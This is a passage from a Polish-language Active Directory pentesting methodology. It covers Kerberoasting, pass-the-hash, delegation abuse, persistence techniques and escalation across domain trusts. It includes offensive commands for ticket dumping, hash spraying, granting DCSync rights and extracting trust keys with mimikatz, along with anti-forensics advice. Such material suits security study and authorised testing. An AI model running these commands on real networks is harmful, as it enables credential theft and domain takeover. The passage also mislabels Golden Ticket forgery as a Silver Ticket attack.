# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Następnie oceń odzyskane dane uwierzytelniające gMSA tak jak każde inne: sprawdź członkostwo w grupach lokalnych i domenowych, prawa logowania, SPN-y, delegowanie oraz dostępne usługi, zanim spróbujesz pass-the-hash. Ta ścieżka odzyskiwania oparta na ACL różni się od [Golden gMSA/dMSA](golden-dmsa-gmsa.md), która pozwala wyprowadzić zarządzane hasła po przejęciu klucza głównego KDS.<sup>[[20]](#references)</sup>

Principal komputera może też mieć kontrolę wychodzącą nad innymi obiektami komputerów lub grupami. Po uzyskaniu takiego principala sprawdź osobno jego zagnieżdżone członkostwa i efektywne ACL-e: prawo zapisu do innego obiektu komputera może umożliwić zmianę konta, a prawa wynikające z członkostwa w grupie mogą prowadzić do uzyskania roli pozwalającej na logowanie. Flaga staged-account, przewidywalna konwencja nazewnictwa ani sama krawędź `GenericWrite` nie dowodzą istnienia pełnej ścieżki.

Czytelna kopia bloba `msDS-ManagedPassword` w pliku, udziale lub kopii zapasowej to osobna ścieżka ujawnienia: ACL odczytu LDAP nie chroni kopii przechowywanej gdzie indziej. Przed interpretacją sprawdź, czy dane rzeczywiście są blobem zarządzanego hasła, i odróżnij to od autoryzowanego odczytu LDAP oraz wyprowadzania hasła z klucza głównego KDS.

### Kerberoast

Kerberoasting polega na pozyskiwaniu **biletów TGS** używanych przez usługi powiązane z kontami użytkowników i łamaniu ich szyfrowania — opartego na hasłach użytkowników — **offline**.

Więcej na ten temat:


{{#ref}}
kerberoast.md
{{#endref}}

### Połączenie zdalne (RDP, SSH, FTP, Win-RM itd.)

Po uzyskaniu danych uwierzytelniających możesz sprawdzić, czy masz dostęp do jakiejkolwiek **maszyny**. Możesz w tym celu użyć **CrackMapExec**, aby spróbować połączyć się z kilkoma serwerami za pomocą różnych protokołów, zgodnie z wynikami skanowania portów.

### Eskalacja uprawnień lokalnie

Jeśli przejąłeś dane uwierzytelniające lub sesję zwykłego użytkownika domeny i możesz uzyskać dostęp do **dowolnej maszyny w domenie**, poszukaj sposobu na **lokalną eskalację uprawnień i zebranie danych uwierzytelniających**. Uprawnienia lokalnego administratora mogą pozwolić na **zrzucenie hashy innych użytkowników** z pamięci (LSASS) i lokalnego magazynu (SAM).

W tej książce znajduje się osobna strona o [**lokalnej eskalacji uprawnień w Windows**](../windows-local-privilege-escalation/index.html) oraz [**lista kontrolna**](../checklist-windows-privilege-escalation.md). Pamiętaj też, aby użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Bilety bieżącej sesji

Jest **mało prawdopodobne**, że wśród **biletów** bieżącego użytkownika znajdziesz takie, które **dadzą Ci dostęp** do nieoczekiwanych zasobów, ale możesz to sprawdzić:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Mając poświadczenia domenowe lub sesję użytkownika, ponownie sprawdź ataki [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): techniki enumeracji z uwierzytelnieniem i wymuszania uwierzytelnienia mogą ujawnić ścieżki relay, które były niedostępne podczas rekonesansu bez uwierzytelnienia.

### Wyszukiwanie poświadczeń w udziałach komputerów | Udziały SMB

Mając już podstawowe poświadczenia, sprawdź, czy możesz **znaleźć** **interesujące pliki udostępnione w AD**. Możesz zrobić to ręcznie, ale jest to bardzo żmudne i powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Kliknij ten link, aby poznać narzędzia, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów**, możesz **umieścić pliki** (na przykład plik SCF), których otwarcie **wyzwoli uwierzytelnienie NTLM przeciwko Tobie**, dzięki czemu możesz **ukraść** **wyzwanie NTLM** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta luka pozwalała każdemu uwierzytelnionemu użytkownikowi **przejąć kontrolę nad kontrolerem domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacja uprawnień w Active Directory Z uprzywilejowanymi poświadczeniami/sesją

**Do przeprowadzenia poniższych ataków zwykłe konto użytkownika domeny nie wystarczy — potrzebujesz specjalnych uprawnień lub poświadczeń.**

### Ekstrakcja hashy

Miejmy nadzieję, że udało Ci się **przejąć jakieś konto lokalnego administratora** za pomocą [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), w tym relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) lub [lokalnej eskalacji uprawnień](../windows-local-privilege-escalation/index.html).\
Teraz pora zrzucić wszystkie hashe z pamięci i systemu lokalnego.\
[**Przeczytaj tę stronę, aby poznać różne sposoby pozyskiwania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy zdobędziesz hash użytkownika**, możesz go użyć, aby **podszyć się pod tego użytkownika**.\
Musisz użyć **narzędzia**, które **przeprowadzi uwierzytelnianie NTLM z użyciem** tego **hasha**, **albo** możesz utworzyć nową **sesję logowania** i **wstrzyknąć** ten **hash** do **LSASS**, aby był używany podczas każdego **uwierzytelniania NTLM**. Tę drugą metodę stosuje mimikatz.\
[**Przeczytaj tę stronę, aby uzyskać więcej informacji.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Celem tego ataku jest **użycie hasha NTLM użytkownika do zażądania biletów Kerberos** jako alternatywy dla typowego Pass The Hash z użyciem protokołu NTLM. Dlatego może być szczególnie **przydatny w sieciach, w których protokół NTLM jest wyłączony**, a jako protokół uwierzytelniania dozwolony jest tylko **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną bilet uwierzytelniający użytkownika** zamiast jego hasła lub wartości hash. Następnie używają skradzionego biletu, aby **podszyć się pod użytkownika** i uzyskać nieautoryzowany dostęp do zasobów oraz usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponowne użycie poświadczeń

Jeśli masz **hash** lub **hasło** **lokalnego administratora**, spróbuj **zalogować się lokalnie** na innych **komputerach**, używając tych danych.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Pamiętaj, że jest to dość **głośne** i **LAPS** może temu **zapobiec**.

### Nadużycia MSSQL i zaufane linki

Jeśli użytkownik ma uprawnienia do **uzyskiwania dostępu do instancji MSSQL**, może być w stanie **wykonywać polecenia** na hoście MSSQL (jeśli działa jako SA), **wykraść** **hash** NetNTLM, a nawet przeprowadzić **atak** **relay**.\
Jeśli instancja MSSQL jest zaufana przez inną instancję za pośrednictwem linku do bazy danych, użytkownik z uprawnieniami do połączonej bazy może być w stanie **wykorzystać relację zaufania do wykonywania zapytań w drugiej instancji**. Takie relacje zaufania można łączyć, co może ostatecznie doprowadzić do błędnie skonfigurowanej bazy danych, w której użytkownik będzie mógł wykonywać polecenia.\
**Linki między bazami danych działają również w przypadku relacji zaufania między lasami.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Nadużycia platform do zarządzania zasobami IT i wdrażania

Zewnętrzne pakiety do inwentaryzacji i wdrażania często zapewniają dostęp do poświadczeń i wykonywania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz dowolny obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na komputerze, będziesz w stanie zrzucić z pamięci bilety TGT wszystkich użytkowników logujących się na tym komputerze.\
Jeśli więc **Domain Admin zaloguje się na tym komputerze**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego za pomocą [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć Print Server** (miejmy nadzieję, że będzie to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma uprawnienia do „Constrained Delegation”, będzie mógł **podszyć się pod dowolnego użytkownika, aby uzyskać dostęp do wybranych usług na komputerze**.\
Następnie, jeśli **przejmiesz hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet administratorów domeny), aby uzyskać dostęp do wybranych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia uzyskanie możliwości wykonywania kodu z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Nadużycia uprawnień/ACL

Przejęty użytkownik może mieć **interesujące uprawnienia do niektórych obiektów domeny**, które mogą pozwolić na późniejsze **przemieszczanie się** w poziomie/**eskalację** uprawnień.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Nadużycia usługi Printer Spooler

Wykrycie **nasłuchującej usługi Spool** w domenie może zostać **wykorzystane** do **pozyskania nowych poświadczeń** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Nadużycia sesji użytkowników zewnętrznych

Jeśli **inni użytkownicy** **uzyskują dostęp** do **przejętego** komputera, możliwe jest **pozyskanie poświadczeń z pamięci**, a nawet **wstrzyknięcie beaconów do ich procesów**, aby się pod nich podszyć.\
Zazwyczaj użytkownicy uzyskują dostęp do systemu przez RDP, dlatego poniżej opisano, jak przeprowadzić kilka ataków na sesje RDP innych użytkowników:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania **lokalnym hasłem Administratora** na komputerach przyłączonych do domeny, który gwarantuje, że hasło jest **losowe**, unikatowe i często **zmieniane**. Hasła te są przechowywane w Active Directory, a dostęp do nich jest kontrolowany za pomocą ACL i ograniczony do autoryzowanych użytkowników. Wystarczające uprawnienia do uzyskania dostępu do tych haseł umożliwiają przeskakiwanie na inne komputery.


{{#ref}}
laps.md
{{#endref}}

### Kradzież certyfikatów

**Pozyskanie certyfikatów** z przejętego komputera może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Nadużycia szablonów certyfikatów

Jeśli skonfigurowano **podatne szablony**, można je wykorzystać do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation z kontem o wysokich uprawnieniach

### Zrzucanie poświadczeń domenowych

Po uzyskaniu uprawnień **Domain Admin**, a jeszcze lepiej **Enterprise Admin**, możesz **zrzucić** **bazę danych domeny**: _ntds.dit_.

[**Więcej informacji o ataku DCSync znajdziesz tutaj**](dcsync.md).

[**Więcej informacji o kradzieży pliku NTDS.dit znajdziesz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Czytelne archiwum kopii zapasowej zawierające `ntds.dit` wraz z gałęzią rejestru `SYSTEM` należy traktować jako ujawnione dane katalogowe jeszcze przed rozpakowaniem. Nieaktualny hash hasła nie oznacza, że inne atrybuty obiektów są bezpieczne: pola takie jak `description` mogą zawierać poświadczenia lub informacje operacyjne. Najpierw sprawdź nazwy plików w archiwum i nie umieszczaj rozpakowanej zawartości bazy danych w standardowych wynikach enumeracji.

### Privesc jako mechanizm utrzymywania dostępu

Niektóre z omówionych wcześniej technik można wykorzystać do utrzymywania dostępu.\
Na przykład możesz:

- Sprawić, by użytkownicy byli podatni na [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Spraw, aby użytkownicy byli podatni na [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Nadaj użytkownikowi uprawnienia [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Atak Silver Ticket** tworzy **prawidłowy bilet Ticket Granting Service (TGS)** dla określonej usługi, wykorzystując **hash NTLM** (na przykład **hash konta komputera**). Metoda ta służy do **uzyskania dostępu z uprawnieniami do usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Atak Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **hasha NTLM konta krbtgt** w środowisku Active Directory (AD). To konto jest szczególne, ponieważ służy do podpisywania wszystkich **biletów Ticket Granting Ticket (TGT)**, które są niezbędne do uwierzytelniania w sieci AD.

Po uzyskaniu tego hasha atakujący może tworzyć **TGT** dla dowolnie wybranego konta (atak Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są podobne do golden tickets, ale fałszuje się je w sposób, który **omija typowe mechanizmy wykrywania golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Utrzymanie dostępu do konta za pomocą certyfikatów**

**Posiadanie certyfikatów konta lub możliwość ich uzyskania na żądanie** to bardzo dobry sposób na utrzymanie dostępu do konta użytkownika (nawet jeśli zmieni on hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Utrzymanie dostępu do domeny za pomocą certyfikatów**

**Certyfikaty umożliwiają również utrzymanie dostępu z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupa AdminSDHolder

Obiekt **AdminSDHolder** w Active Directory chroni **grupy uprzywilejowane** (takie jak Domain Admins i Enterprise Admins), stosując do nich standardową **listę kontroli dostępu (ACL)**, która zapobiega nieautoryzowanym zmianom. Można jednak wykorzystać tę funkcję: jeśli atakujący zmieni ACL obiektu AdminSDHolder, aby przyznać zwykłemu użytkownikowi pełny dostęp, użytkownik ten zyska szeroką kontrolę nad wszystkimi grupami uprzywilejowanymi. Mechanizm bezpieczeństwa, który ma chronić, może więc przynieść odwrotny skutek i umożliwić nieuprawniony dostęp, jeśli nie będzie dokładnie monitorowany.

[**Więcej informacji o grupie AdminDSHolder znajdziesz tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Poświadczenia DSRM

Na każdym **kontrolerze domeny (DC)** istnieje konto **lokalnego administratora**. Po uzyskaniu praw administratora na takim komputerze można wyodrębnić hash lokalnego Administratora za pomocą **mimikatz**. Następnie należy zmodyfikować rejestr, aby **włączyć używanie tego hasła** i umożliwić zdalny dostęp do lokalnego konta Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Utrzymanie dostępu przez ACL

Możesz **przyznać** użytkownikowi **specjalne uprawnienia** do określonych obiektów domeny, które pozwolą mu **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Deskryptory zabezpieczeń

**Deskryptory zabezpieczeń** służą do **przechowywania** **uprawnień**, jakie **obiekt** ma **do innego obiektu**. Wystarczy **niewielka zmiana** w **deskryptorze zabezpieczeń** obiektu, aby uzyskać bardzo interesujące uprawnienia do tego obiektu bez konieczności należenia do grupy uprzywilejowanej.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects: przeciwdziałanie analizie śledczej / unikanie wykrycia

Wykorzystaj pomocniczą klasę `dynamicObject`, aby tworzyć krótkotrwałe podmioty zabezpieczeń, obiekty GPO lub rekordy DNS z ustawionymi `entryTTL`/`msDS-Entry-Time-To-Die`. Usuną się automatycznie bez tworzenia tombstones, zacierając ślady w LDAP, ale pozostawiając osierocone SID-y, nieprawidłowe odwołania `gPLink` lub buforowane odpowiedzi DNS (np. zanieczyszczenie ACE w AdminSDHolder albo złośliwe przekierowania `gPCFileSysPath`/zintegrowanego z AD DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **uniwersalne hasło** zapewniające dostęp do wszystkich kont domeny.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Dowiedz się tutaj, czym jest SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz utworzyć **własny SSP**, aby **przechwytywać** w **postaci jawnego tekstu** **poświadczenia** używane do uzyskania dostępu do komputera.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy kontroler domeny** w AD i używa go do **modyfikowania atrybutów** (SIDHistory, SPN...) określonych obiektów, **nie pozostawiając** żadnych **logów** dotyczących tych **modyfikacji**. Wymaga uprawnień **DA** i dostępu do **domeny głównej**.\
Pamiętaj, że użycie nieprawidłowych danych może spowodować pojawienie się bardzo niepokojących logów.


{{#ref}}
dcshadow.md
{{#endref}}

### Utrzymanie dostępu przez LAPS

Wcześniej omówiliśmy, jak eskalować uprawnienia, jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Hasła te można jednak również wykorzystać do **utrzymania dostępu**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Eskalacja uprawnień w lesie — zaufania między domenami

Microsoft uznaje **las** za granicę bezpieczeństwa. Oznacza to, że **przejęcie jednej domeny może potencjalnie doprowadzić do przejęcia całego lasu**.<sup>[[1]](#references)</sup>

### Podstawowe informacje

[**Zaufanie między domenami**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa, który umożliwia użytkownikowi z jednej **domeny** dostęp do zasobów w innej **domenie**. Tworzy ono powiązanie między systemami uwierzytelniania obu domen, umożliwiając płynny przepływ weryfikacji uwierzytelniania. Konfigurując zaufanie, domeny wymieniają i przechowują określone **klucze** na swoich **kontrolerach domeny (DC)**, które są niezbędne do zapewnienia integralności zaufania.

W typowym scenariuszu użytkownik, który chce uzyskać dostęp do usługi w **zaufanej domenie**, musi najpierw poprosić kontroler domeny swojej domeny o specjalny bilet nazywany **międzydomenowym TGT**. TGT jest szyfrowany współdzielonym **kluczem**, na który zgodziły się obie domeny. Następnie użytkownik przedstawia ten TGT **kontrolerowi domeny zaufanej domeny**, aby uzyskać bilet usługi (**TGS**). Po pomyślnej weryfikacji międzydomenowego TGT kontroler domeny zaufanej domeny wystawia TGS, który przyznaje użytkownikowi dostęp do usługi.

**Kroki**:

1. **Komputer kliencki** w **Domenie 1** rozpoczyna proces, używając swojego **hasha NTLM** do zażądania **biletu Ticket Granting Ticket (TGT)** od swojego **kontrolera domeny (DC1)**.
2. Jeśli klient zostanie pomyślnie uwierzytelniony, DC1 wystawia nowy TGT.
3. Następnie klient żąda od DC1 **międzydomenowego TGT**, potrzebnego do uzyskania dostępu do zasobów w **Domenie 2**.
4. Międzydomenowy TGT jest szyfrowany **kluczem zaufania** współdzielonym przez DC1 i DC2 w ramach dwukierunkowego zaufania między domenami.
5. Klient przekazuje międzydomenowy TGT do **kontrolera domeny w Domenie 2 (DC2)**.
6. DC2 weryfikuje międzydomenowy TGT za pomocą współdzielonego klucza zaufania i, jeśli bilet jest prawidłowy, wystawia **bilet Ticket Granting Service (TGS)** dla serwera w Domenie 2, do którego klient chce uzyskać dostęp.
7. Na koniec klient przedstawia ten TGS serwerowi. Bilet jest szyfrowany hashem konta serwera i umożliwia dostęp do usługi w Domenie 2.

### Różne rodzaje zaufania

Warto pamiętać, że **zaufanie może być jednokierunkowe lub dwukierunkowe**. W przypadku zaufania dwukierunkowego domeny ufają sobie nawzajem, natomiast w relacji **jednokierunkowej** jedna domena jest **zaufana**, a druga jest domeną **ufającą**. W tym drugim przypadku **dostęp do zasobów domeny ufającej można uzyskać tylko z domeny zaufanej**.

Jeśli Domena A ufa Domenie B, A jest domeną ufającą, a B domeną zaufaną. Ponadto w **Domenie A** jest to zaufanie **wychodzące**, a w **Domenie B** — zaufanie **przychodzące**.

**Różne relacje zaufania**

- **Zaufania nadrzędny-podrzędny**: Typowa konfiguracja w tym samym lesie, w której domena podrzędna automatycznie ma dwukierunkowe, przechodnie zaufanie z domeną nadrzędną. Oznacza to, że żądania uwierzytelnienia mogą swobodnie przepływać między domeną nadrzędną a podrzędną.
- **Zaufania skrótowe**: Nazywane również „zaufaniami skrótowymi” (shortcut trusts), są ustanawiane między domenami podrzędnymi, aby przyspieszyć przekazywanie żądań. W złożonych lasach przekazywanie żądań uwierzytelnienia zwykle wymaga przejścia w górę do katalogu głównego lasu, a następnie w dół do domeny docelowej. Utworzenie zaufania skrótowego skraca tę drogę, co jest szczególnie przydatne w środowiskach rozproszonych geograficznie.
- **Zaufania zewnętrzne**: Są konfigurowane między różnymi, niezależnymi domenami i z założenia są nieprzechodnie. Zgodnie z [dokumentacją Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), zaufania zewnętrzne ułatwiają dostęp do zasobów w domenie poza bieżącym lasem, która nie jest połączona z nim zaufaniem między lasami. Zaufania zewnętrzne zwiększają bezpieczeństwo dzięki filtrowaniu SID.
- **Zaufania z katalogiem głównym drzewa**: Są automatycznie ustanawiane między domeną główną lasu a nowo dodanym katalogiem głównym drzewa. Choć rzadko się z nimi spotyka, są istotne przy dodawaniu nowych drzew domen do lasu, ponieważ pozwalają im zachować unikatową nazwę domeny i zapewniają dwukierunkową przechodniość. Więcej informacji znajdziesz w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Zaufania między lasami**: To dwukierunkowe, przechodnie zaufania między domenami głównymi dwóch lasów, które również stosują filtrowanie SID w celu zwiększenia bezpieczeństwa.
- **Zaufania MIT**: Są ustanawiane z domenami Kerberos spoza Windows, zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120). Zaufania MIT są bardziej wyspecjalizowane i przeznaczone dla środowisk wymagających integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Inne różnice w **relacjach zaufania**

- Relacja zaufania może być **przechodnia** (A ufa B, B ufa C, więc A ufa C) lub **nieprzechodnia**.
- Relacja zaufania może być **dwukierunkowa** (domeny ufają sobie nawzajem) albo **jednokierunkowa** (jedna domena ufa drugiej).

### Ścieżka ataku

1. **Wylicz** relacje zaufania.
2. Sprawdź, czy jakikolwiek **podmiot zabezpieczeń** (użytkownik/grupa/komputer) ma **dostęp** do zasobów **innej domeny**, na przykład dzięki wpisom ACE lub członkostwu w grupach tej domeny. Poszukaj **relacji między domenami** (prawdopodobnie właśnie w tym celu ustanowiono zaufanie).
   1. W tym przypadku kerberoast może być kolejną opcją.
3. **Przejmij** **konta**, które umożliwiają **przechodzenie** między domenami.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie za pomocą trzech głównych mechanizmów:

- **Członkostwo w grupie lokalnej**: Podmioty zabezpieczeń mogą być dodane do grup lokalnych na komputerach, na przykład do grupy „Administrators” na serwerze, co daje im znaczną kontrolę nad tym komputerem.
- **Członkostwo w grupie obcej domeny**: Podmioty zabezpieczeń mogą również należeć do grup w obcej domenie. Skuteczność tej metody zależy jednak od rodzaju zaufania i zakresu grupy.
- **Listy kontroli dostępu (ACL)**: Podmioty zabezpieczeń mogą być wskazane w **ACL**, w szczególności jako elementy **ACE** w ramach **DACL**, co daje im dostęp do określonych zasobów. Osobom, które chcą lepiej poznać działanie ACL, DACL i ACE, przyda się dokument „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”.<sup>[[17]](#references)</sup>

### Znajdowanie użytkowników/grup zewnętrznych z uprawnieniami

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć obce podmioty zabezpieczeń w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/lasu**.

Możesz to sprawdzić w **Bloodhound** lub za pomocą powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Eskalacja uprawnień w lesie z domeny podrzędnej do nadrzędnej

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Inne sposoby enumerowania relacji zaufania między domenami:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Istnieją **2 zaufane klucze**: jeden dla _Child --> Parent_, a drugi dla _Parent_ --> _Child_.\
> Klucz używany przez bieżącą domenę możesz sprawdzić za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Podnieś uprawnienia do poziomu Enterprise admin w domenie podrzędnej/nadrzędnej, nadużywając relacji zaufania za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie, w jaki sposób można wykorzystać Configuration Naming Context (NC), ma kluczowe znaczenie. Configuration NC służy jako centralne repozytorium danych konfiguracyjnych w środowiskach Active Directory (AD), obejmujące cały las. Dane te są replikowane do każdego kontrolera domeny (DC) w lesie, a zapisywalne DC przechowują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **uprawnienia SYSTEM na DC**, najlepiej podrzędnym DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o lokacjach wszystkich komputerów dołączonych do domeny w lesie AD. Mając uprawnienia SYSTEM na dowolnym DC, atakujący mogą łączyć GPO z lokacjami root DC. Działanie to może doprowadzić do przejęcia domeny głównej przez modyfikowanie zasad stosowanych w tych lokacjach.

Szczegółowe informacje można znaleźć w opracowaniu na temat [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Przejmij dowolne gMSA w lesie**

Jednym z wektorów ataku jest wycelowanie w uprzywilejowane gMSA w domenie. Klucz główny KDS, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, można uzyskać dostęp do klucza głównego KDS i obliczyć hasła do dowolnych gMSA w całym lesie.

Szczegółową analizę i instrukcje krok po kroku można znaleźć tutaj:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak na delegowane MSA (BadSuccessor – nadużycie atrybutów migracji):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe zewnętrzne opracowanie: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Atak polegający na zmianie schematu**

Ta metoda wymaga cierpliwości i oczekiwania na utworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować schemat AD, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to doprowadzić do nieautoryzowanego dostępu do nowo tworzonych obiektów AD i przejęcia nad nimi kontroli.

Więcej informacji można znaleźć w opracowaniu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Od DA do EA za pomocą ADCS ESC5**

Luka ADCS ESC5 polega na przejęciu kontroli nad obiektami Public Key Infrastructure (PKI) w celu utworzenia szablonu certyfikatu umożliwiającego uwierzytelnianie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, przejęcie zapisywalnego podrzędnego DC umożliwia przeprowadzenie ataków ESC5.

Więcej informacji można znaleźć w opracowaniu [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Jeśli ADCS nie jest dostępne, atakujący mogą skonfigurować niezbędne komponenty, jak opisano w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domena w zewnętrznym lesie — jednokierunkowa (przychodząca) lub dwukierunkowa

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

